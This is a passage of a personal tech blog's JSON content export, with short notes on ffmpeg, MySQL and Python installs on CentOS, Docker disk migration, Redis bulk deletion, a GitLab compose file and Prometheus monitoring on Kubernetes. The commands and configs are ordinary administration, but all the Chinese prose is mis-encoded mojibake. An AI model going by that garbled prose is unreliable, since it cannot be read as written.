é‚®ä»¶åˆ—è¡¨","slug":"history/tech/5d035e36717f3b4c09d43491","date":"2019-06-13T20:43:34.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d035e36717f3b4c09d43491/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d035e36717f3b4c09d43491/","excerpt":"","text":"go é‚®ä»¶åˆ—è¡¨Goé‚®ä»¶ç»„çš„åœ°å€ä¸ºhttp://groups.google.com/group/golang-nuts ã€‚è¯¥é‚®ä»¶åˆ—è¡¨å¯¹æ‰€æœ‰äººå…¬å¼€ï¼Œä½  å¯ä»¥åœ¨è¿™ä¸ªé¡µé¢ä¸Šç›´æ¥åŠ å…¥ã€‚è¯¥é‚®ä»¶åˆ—è¡¨çš„æ²Ÿé€šè¯­è¨€ä¸ºè‹±è¯­ã€‚æ ¹æ®æˆ‘ä»¬çš„ç»éªŒï¼Œåœ¨è¯¥é‚®ä»¶åˆ—è¡¨ä¸Š æå‡ºçš„é—®é¢˜é€šå¸¸åœ¨24å°æ—¶å†…å¯ä»¥å¾—åˆ°è§£å†³ã€‚ Goçš„ä¸­æ–‡é‚®ä»¶ç»„ä¸ºhttp://groups.google.com/group/golang-chinaã€‚å¦‚æœä½ æ›´ä¹ æƒ¯ä¸­æ–‡è®¨è®ºç¯å¢ƒï¼Œ å¯ä»¥å‚ä¸ã€‚å¦å¤–ï¼Œå°½ç®¡http://groups.google.com/group/ecugä¸æ˜¯ä»¥Goè¯­è¨€ä¸ºä¸“é¢˜ï¼Œä½†æœ‰å…³Goè¯­è¨€ çš„æœåŠ¡ç«¯å¼€å‘ï¼Œä¹Ÿæ˜¯å®ƒé‡è¦çš„è¯é¢˜ä¹‹ä¸€ã€‚ç½‘ç«™èµ„æº Goè¯­è¨€çš„å®˜æ–¹ç½‘ç«™ä¸º http://golang.orgï¼Œè¿™ä¸ªç½‘ç«™åªéšç€Goçš„ä¸»è¦ç‰ˆæœ¬å‘å¸ƒè€Œæ›´æ–°ï¼Œå› æ­¤å¹¶ ä¸åæ˜ Goçš„æ–°è¿›å±•ã€‚å¦‚æœè¯»è€…å¸Œæœ›è·Ÿè¿›Goè¯­è¨€çš„æ–°è¿›å±•ï¼Œå¯ä»¥åˆ°http://code.google.com/p/go/ ç›´æ¥ä¸‹è½½æ–°ä»£ç ã€‚è¿™é‡ŒæŒç»­å¯¹Goèµ„æ–™è¿›è¡Œäº†æ•´ç†ï¼šhttp://github.com/wonderfo/wonderfogo/wikiã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ts è½¬ mp4","slug":"history/tech/5d025c5a4022836d72dd63c8","date":"2019-06-13T02:23:22.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d025c5a4022836d72dd63c8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d025c5a4022836d72dd63c8/","excerpt":"","text":"123ffmpeg -y -i video.ts -c:v libx264 -c:a copy -bsf:a aac_adtstoasc output.mp4ffmpeg -y -i &lt;in file&gt; -vcodec copy -acodec copy -vbsf h264_mp4toannexb &lt;output file&gt;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"windows å¯ç”¨ telnet","slug":"history/tech/5d01eebb4022836d72dd63c7","date":"2019-06-12T18:35:39.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d01eebb4022836d72dd63c7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d01eebb4022836d72dd63c7/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mesg ttyname failed Inappropriate ioctl for device","slug":"history/tech/5cfdf10b4022836d72dd63c6","date":"2019-06-09T17:56:27.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5cfdf10b4022836d72dd63c6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cfdf10b4022836d72dd63c6/","excerpt":"","text":"æŠ¥é”™ï¼š1mesg: ttyname failed: Inappropriate ioctl for device12345vim /root/.profileæ›¿æ¢ï¼šmesg n || trueä¸ºï¼štty -s &amp;&amp; mesg n","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ngrok å†…ç½‘ç©¿é€","slug":"history/tech/5cf73ce94022836d72dd63c3","date":"2019-06-05T03:54:17.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5cf73ce94022836d72dd63c3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cf73ce94022836d72dd63c3/","excerpt":"","text":"https://twindy.org/nginx-ngrock-net-through/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos ç¼–è¯‘å®‰è£… python3.7.3","slug":"history/tech/5cf765524022836d72dd63c5","date":"2019-06-04T18:46:42.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5cf765524022836d72dd63c5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cf765524022836d72dd63c5/","excerpt":"","text":"ç¼–è¯‘ä¹‹å‰éœ€è¦ç»™ç³»ç»Ÿå®‰è£… sqlite3ï¼Œå¦åˆ™ä¼šæŠ¥ No module named _sqlite31234yum install sqlite-devel ./configure --prefix=/opt/python/python-3.7.3 --enable-optimizationsmake -j32make installmake install æŠ¥é”™ï¼š1ModuleNotFoundError: No module named &apos;_ctypes&apos;è§£å†³ï¼š1yum install libffi-devel -y","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos7 å®‰è£… ffmpeg","slug":"history/tech/5cf75e574022836d72dd63c4","date":"2019-06-04T18:16:55.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5cf75e574022836d72dd63c4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cf75e574022836d72dd63c4/","excerpt":"","text":"123sudo yum install epel-release -ysudo yum update -ysudo shutdown -r nowå®‰è£…Nux Dextop Yum æº12sudo rpm --import http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.rosudo rpm -Uvh http://li.nux.ro/download/nux/dextop/el7/x86_64/nux-dextop-release-0-5.el7.nux.noarch.rpmå®‰è£… ffmpeg1sudo yum install ffmpeg ffmpeg-devel -y","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"windows å­ç³»ç»Ÿå¼€æœºå¯åŠ¨","slug":"history/tech/5cf492704e2c765404d06dc5","date":"2019-06-03T03:22:24.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5cf492704e2c765404d06dc5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cf492704e2c765404d06dc5/","excerpt":"","text":"windows ä¸­æ“ä½œwin+r(å¼€å§‹è¿è¡Œ):è¾“å…¥:1shell: startupåˆ›å»ºæ–‡ä»¶ wls_rclocal.vbs:12Set ws = CreateObject(&quot;Wscript.Shell&quot;)ws.run &quot;ubuntu1804 run sudo /etc/init.wsl start&quot;, vbhide å­ç³»ç»Ÿä¸­æ“ä½œï¼šåœ¨ /etc/sudoers.d ç›®å½•ä¸‹é¢å»ºç«‹ nopasswd æ–‡ä»¶ï¼š12vim /etc/sudoers.d/rc-local%sudo ALL=NOPASSWD: /etc/init.wslå†™å…¥å¯åŠ¨å‘½ä»¤:1vim /etc/init.wsl","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"è®¾è®¡ç½‘ç«™","slug":"history/ui/5cefb0bdead834222be7595f","date":"2019-05-29T22:30:21.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5cefb0bdead834222be7595f/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5cefb0bdead834222be7595f/","excerpt":"","text":"http://www.shejidaren.com","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"redis æ‰¹é‡åˆ é™¤","slug":"history/tech/5ce7a407ead834222be7595e","date":"2019-05-23T19:57:59.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5ce7a407ead834222be7595e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ce7a407ead834222be7595e/","excerpt":"","text":"1redis-cli -n 4 keys \"5b*\" | xargs redis-cli -n 4 del","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"linux å…³é—­ swap åˆ†åŒº","slug":"history/tech/5ce2361148f4e4100d0e1461","date":"2019-05-19T17:07:29.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5ce2361148f4e4100d0e1461/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ce2361148f4e4100d0e1461/","excerpt":"","text":"ä¸´æ—¶ç”Ÿæ•ˆ:1sysctl -w vm.swappiness=0æ°¸ä¹…ç”Ÿæ•ˆï¼š12echo &quot;vm.swappiness = 0&quot;&gt;&gt; /etc/sysctl.confsysctl -p","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"docker å æ»¡ç£ç›˜è¿ç§»","slug":"history/tech/5cdebec031a604f66b46a65a","date":"2019-05-17T02:01:36.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5cdebec031a604f66b46a65a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cdebec031a604f66b46a65a/","excerpt":"","text":"æŸ¥çœ‹docker ä½¿ç”¨çš„ç©ºé—´ï¼š1docker system dfæŸ¥æ‰¾å¹¶æ¸…ç©º docker container æ—¥å¿—:1echo &quot;&quot; &gt;&gt; `find /var/lib/docker/containers/ -name *.log`è¿ç§» /var/lib/docker :12systemctl stop dockerrsync -avz /var/lib/docker /data/docker/ä¿®æ”¹ docker.service æ–‡ä»¶ï¼š12// å¦‚æœä¸çŸ¥é“ docker.service æ–‡ä»¶ä½ç½®ï¼Œå¯ä»¥æ‰§è¡Œ systemctl enable docker æŸ¥çœ‹, åŒæ—¶å¯ä»¥ä¿®æ”¹ container æ—¥å¿—å­˜å‚¨å‚æ•°/usr/bin/dockerd --graph=/home/docker/lib/docker --log-opt max-size=100m --log-opt max-file=1å¯åŠ¨ docker:1systemctl start dockerå¯¹äºå·²ç»å¯åŠ¨çš„dockerå®¹å™¨ï¼Œç›´æ¥ä¿®æ”¹ docker.service æ–‡ä»¶ä¸èµ·ä½œç”¨éœ€è¦ä¿®æ”¹ /var/lib/docker/container/&lt;containerId&gt;/hostconfig.json, åœ¨è¿™ä¹‹å‰ï¼Œä¸€å®šè¦å…ˆåœæ­¢dockeræœåŠ¡systemctl stop docker12345678...&quot;LogConfig&quot;: &#123; &quot;Type&quot;: &quot;json-file&quot;, &quot;Config&quot;: &#123; &quot;max-file&quot;: &quot;1&quot;,&quot;max-size&quot;: &quot;1m&quot; &#125; &#125;,...","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ruby","slug":"history/tech/5cdccfa831a604f66b46a657","date":"2019-05-16T02:49:12.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cdccfa831a604f66b46a657/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cdccfa831a604f66b46a657/","excerpt":"","text":"windows å®‰è£…ï¼š1https://rubyinstaller.org/downloads/å›½å†…æºï¼š1https://gems.ruby-china.com/å…¥é—¨ï¼š1https://ruby-china.github.io/rails-guides/getting_started.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos7 å®‰è£… mysql5.7","slug":"history/tech/5cdd14fa31a604f66b46a659","date":"2019-05-15T19:44:58.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5cdd14fa31a604f66b46a659/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cdd14fa31a604f66b46a659/","excerpt":"","text":"123456wget https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpmyum localinstall mysql57-community-release-el7-11.noarch.rpmyum repolist enabled | grep &quot;mysql.*-community.*&quot;yum install -y mysql-community-serversystemctl enable mysqldsystemctl start mysqld1234567891011grep &apos;temporary password&apos; /var/log/mysqld.logmysql -uroot -pALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;MyNewPass1!&apos;; æˆ–set password for &apos;root&apos;@&apos;localhost&apos;=password(&apos;MyNewPass1!&apos;); mysql&gt; use mysql;mysql&gt; update user set password=PASSWORD(&apos;MyNewPass2!&apos;) where user=&apos;root&apos;;mysql&gt; flush privileges;å‚è€ƒé“¾æ¥ï¼šhttps://www.jianshu.com/p/1dab9a4d0d5f","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"gitlab docker-compose æ–‡ä»¶","slug":"history/tech/5cdd147231a604f66b46a658","date":"2019-05-15T19:42:42.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cdd147231a604f66b46a658/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cdd147231a604f66b46a658/","excerpt":"","text":"1234567891011121314151617gitlab_11: image: &apos;gitlab/gitlab-ce:11.0.1-ce.0&apos; restart: always container_name: gitlab_11 privileged: true hostname: &apos;gitlab.xxx.com&apos; environment: GITLAB_OMNIBUS_CONFIG: | external_url &apos;http://gitlab.xxx.com&apos; ports: - &apos;4080:80&apos; - &apos;4443:443&apos; - &apos;4022:22&apos; volumes: - &apos;/etc/gitlab/gitlab-ce-11.0.1-ce.0:/etc/gitlab&apos; - &apos;/var/log/gitlab/gitlab-ce-11.0.1-ce.0:/var/log/gitlab&apos; - &apos;/data/gitlab/gitlab-ce-11.0.1-ce.0:/var/opt/gitlab&apos;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"k8s ç›‘æ§ prometheus","slug":"history/tech/5cdbc0f831a604f66b46a656","date":"2019-05-14T19:34:16.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cdbc0f831a604f66b46a656/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cdbc0f831a604f66b46a656/","excerpt":"","text":"Prometheus é€šè¿‡å„ç§ exporter æš´éœ²æ•°æ®ï¼Œå¹¶ç”± prometheus server å®šæ—¶å»æ‹‰æ•°æ®ï¼Œç„¶åå­˜å‚¨ã€‚Prometheus Operator, å°½ç®¡è¯¥é¡¹ç›®è¿˜å¤„äº Beta é˜¶æ®µï¼Œä½†æ˜¯å®ƒç»™åœ¨ K8S ä¸­æ­å»ºåŸºäº Prometheus çš„ç›‘æ§æä¾›äº†å¾ˆå¤§çš„ä¾¿åˆ© åˆ›å»º namespaceï¼š1kubectl apply -f namespace.yamlnamespace.yml1234apiVersion: v1kind: Namespacemetadata: name: monitoring RBACrbac.yaml:1234567891011121314151617181920212223242526272829303132333435363738apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata: name: prometheusroleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: prometheussubjects:- kind: ServiceAccount name: prometheus-k8s namespace: monitoring---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata: name: prometheusrules:- apiGroups: [&quot;&quot;] resources: - nodes - nodes/proxy - services - endpoints - pods verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;]- apiGroups: [&quot;&quot;] resources: - configmaps verbs: [&quot;get&quot;]- nonResourceURLs: [&quot;/metrics&quot;] verbs: [&quot;get&quot;]---apiVersion: v1kind: ServiceAccountmetadata: name: prometheus-k8s namespace: monitoring åˆ›å»º Promethes çš„é…ç½®æ–‡ä»¶å…¶ä¸­çš„å†…å®¹ä¸»è¦å‚è€ƒ Prometheus å®˜æ–¹æä¾›çš„ç¤ºä¾‹ å’Œ Prometheus å®˜æ–¹æ–‡æ¡£rbac.yaml:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146apiVersion: v1kind: ConfigMapmetadata: name: prometheus-core namespace: monitoringdata: prometheus.yaml: | global: scrape_interval: 30s scrape_timeout: 30s scrape_configs: - job_name: &apos;kubernetes-apiservers&apos; kubernetes_sd_configs: - role: endpoints scheme: https tls_config: ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token relabel_configs: - source_labels: [__meta_kubernetes_namespace, __meta_kubernetes_service_name, __meta_kubernetes_endpoint_port_name] action: keep regex: default;kubernetes;https # Scrape config for nodes (kubelet). - job_name: &apos;kubernetes-nodes&apos; scheme: https tls_config: ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token kubernetes_sd_configs: - role: node relabel_configs: - action: labelmap regex: __meta_kubernetes_node_label_(.+) - target_label: __address__ replacement: kubernetes.default.svc:443 - source_labels: [__meta_kubernetes_node_name] regex: (.+) target_label: __metrics_path__ replacement: /api/v1/nodes/$&#123;1&#125;/proxy/metrics # Scrape config for Kubelet cAdvisor. - job_name: &apos;kubernetes-cadvisor&apos; scheme: https tls_config: ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token kubernetes_sd_configs: - role: node relabel_configs: - action: labelmap regex: __meta_kubernetes_node_label_(.+) - target_label: __address__ replacement: kubernetes.default.svc:443 - source_labels: [__meta_kubernetes_node_name] regex: (.+) target_label: __metrics_path__ replacement: /api/v1/nodes/$&#123;1&#125;/proxy/metrics/cadvisor - job_name: &apos;kubernetes-service-endpoints&apos; kubernetes_sd_configs: - role: endpoints relabel_configs: - action: labelmap regex: __meta_kubernetes_service_label_(.+) - source_labels: [__meta_kubernetes_namespace] action: replace target_label: kubernetes_namespace - source_labels: [__meta_kubernetes_service_name] action: replace target_label: kubernetes_name - job_name: &apos;kubernetes-services&apos; metrics_path: /probe params: module: [http_2xx] kubernetes_sd_configs: - role: service relabel_configs: - source_labels: [__address__] target_label: __param_target - target_label: __address__ replacement: blackbox-exporter.example.com:9115 - source_labels: [__param_target] target_label: instance - action: labelmap regex: __meta_kubernetes_service_label_(.+) - source_labels: [__meta_kubernetes_namespace] target_label: kubernetes_namespace - source_labels: [__meta_kubernetes_service_name] target_label: kubernetes_name - job_name: &apos;kubernetes-ingresses&apos; metrics_path: /probe params: module: [http_2xx] kubernetes_sd_configs: - role: ingress relabel_configs: - source_labels: [__meta_kubernetes_ingress_scheme,__address__,__meta_kubernetes_ingress_path] regex: (.+);(.+);(.+) replacement: $&#123;1&#125;://$&#123;2&#125;$&#123;3&#125; target_label: __param_target - target_label: __address__ replacement: blackbox-exporter.example.com:9115 - source_labels: [__param_target] target_label: instance - action: labelmap regex: __meta_kubernetes_ingress_label_(.+) - source_labels: [__meta_kubernetes_namespace] target_label: kubernetes_namespace - source_labels: [__meta_kubernetes_ingress_name] target_label: kubernetes_name - job_name: &apos;kubernetes-pods&apos; kubernetes_sd_configs: - role: pod relabel_configs: - action: labelmap regex: __meta_kubernetes_pod_label_(.+) - source_labels: [__meta_kubernetes_namespace] action: replace target_label: kubernetes_namespace - source_labels: [__meta_kubernetes_pod_name] action: replace target_label: kubernetes_pod_name éƒ¨ç½² Prometheusprometheus.yaml:12345678910111213141516171819202122232425262728293031323334353637383940414243444546apiVersion: extensions/v1beta1kind: Deploymentmetadata: name: prometheus-core namespace: monitoring labels: app: prometheus component: corespec: replicas: 1 template: metadata: name: prometheus-main labels: app: prometheus component: core spec: serviceAccountName: prometheus-k8s containers: - name: prometheus image: taobeier/prometheus:v2.6.0 args: - &apos;--storage.tsdb.retention=24h&apos; - &apos;--storage.tsdb.path=/prometheus&apos; - &apos;--config.file=/etc/prometheus/prometheus.yaml&apos; ports: - name: webui containerPort: 9090 resources: requests: cpu: 500m memory: 500M limits: cpu: 500m memory: 500M volumeMounts: - name: data mountPath: /prometheus - name: config-volume mountPath: /etc/prometheus volumes: - name: data emptyDir: &#123;&#125; - name: config-volume configMap: name: prometheus-core æŸ¥çœ‹éƒ¨ç½²æƒ…å†µ:1kubectl -n monitoring get allä½¿ç”¨ Service å°† Promethes çš„æœåŠ¡æš´éœ²å‡ºæ¥:1234567891011121314151617apiVersion: v1kind: Servicemetadata: labels: app: prometheus component: core name: prometheus namespace: monitoringspec: ports: - protocol: TCP port: 9090 targetPort: 9090 selector: app: prometheus component: core type: NodePort å®‰è£… Node exporternode_exporterå½“æˆ‘ä»¬ç›´æ¥å°† Node exporter éƒ¨ç½²åœ¨å®¿ä¸»æœºä¸Šæ—¶ï¼Œæˆ‘ä»¬æœ€èµ·ç éœ€è¦ä¿è¯ä¸¤ç‚¹ï¼š121. Promethes æœåŠ¡å¯ä¸å®ƒæ­£å¸¸é€šä¿¡ï¼ˆPromethes é‡‡ç”¨ Pull çš„æ–¹å¼é‡‡é›†æ•°æ®ï¼‰2. éœ€è¦æœåŠ¡ä¿æ´»ï¼Œå¦‚æœ exporter æŒ‚æ‰äº†ï¼Œé‚£è‡ªç„¶å°±å–ä¸åˆ°æ•°æ®æ‰€ä»¥æˆ‘ä»¬è¦ç›‘æ§é›†ç¾¤ä¸­æ‰€æœ‰çš„æœºå™¨æ—¶ï¼ŒDaemonSet æ˜¯ä¸€ç§å¾ˆåˆé€‚çš„çš„éƒ¨ç½²æ–¹å¼ï¼Œå¯ç›´æ¥å°† Node exporter éƒ¨ç½²è‡³é›†ç¾¤çš„æ¯ä¸ªèŠ‚ç‚¹ä¸ŠdaemonSet.yaml:12345678910111213141516171819202122232425262728apiVersion: extensions/v1beta1kind: DaemonSetmetadata: name: prometheus-node-exporter namespace: monitoring labels: app: prometheus component: node-exporterspec: template: metadata: name: prometheus-node-exporter labels: app: prometheus component: node-exporter spec: tolerations: - key: node-role.kubernetes.io/master effect: NoSchedule containers: - image: taobeier/node-exporter:v0.17.0 name: prometheus-node-exporter ports: - name: prom-node-exp containerPort: 9100 hostPort: 9100 hostNetwork: true hostPID: trueè®© Promethes æŠ“å–æ•°æ®:è¿™é‡Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨äº†æ·»åŠ  annotations çš„æ–¹å¼ï¼Œè®© Promethes è‡ªåŠ¨çš„é€šè¿‡ Kubernetes SD å‘ç°æˆ‘ä»¬æ–°æ·»åŠ çš„ exporter ï¼ˆæˆ–è€…è¯´èµ„æºï¼‰1234567891011121314151617181920apiVersion: v1kind: Servicemetadata: annotations: prometheus.io/scrape: &apos;true&apos; name: prometheus-node-exporter namespace: monitoring labels: app: prometheus component: node-exporterspec: clusterIP: None ports: - name: prometheus-node-exporter port: 9100 protocol: TCP selector: app: prometheus component: node-exporter type: ClusterIPPrometheus æ”¯æŒå¤šç§ exporter æš´éœ²å„ç§æŒ‡æ ‡ï¼Œè€Œä¸”æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ Grafana ä½œä¸ºæˆ‘ä»¬ç›‘æ§çš„å±•ç¤ºæ‰‹æ®µå¦‚æœè¦åš Dashboard æ¨èä½¿ç”¨ Kubernetes cluster monitoring (via Prometheus) ã€‚å¦å¤–ï¼Œç›‘æ§å…¶å®æ¶‰åŠçš„å†…å®¹å¾ˆå¤šï¼ŒåŒ…æ‹¬æ•°æ®æŒä¹…åŒ–æ–¹å¼ã€‚ä»¥åŠæ˜¯å¦è€ƒè™‘ä¸é›†ç¾¤å¤–çš„ Prometheus é›†ç¾¤åšé‚¦è”æ¨¡å¼ç­‰ã€‚è‡³äºåº”ç”¨ç›‘æ§ï¼Œä¹Ÿå¯ä½¿ç”¨å®ƒçš„ SDK æ¥å®Œæˆã€‚å‚è€ƒé“¾æ¥ï¼šprometheusPromQLPrometheus Operator","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ä¸€ä¸ªå›¾æ 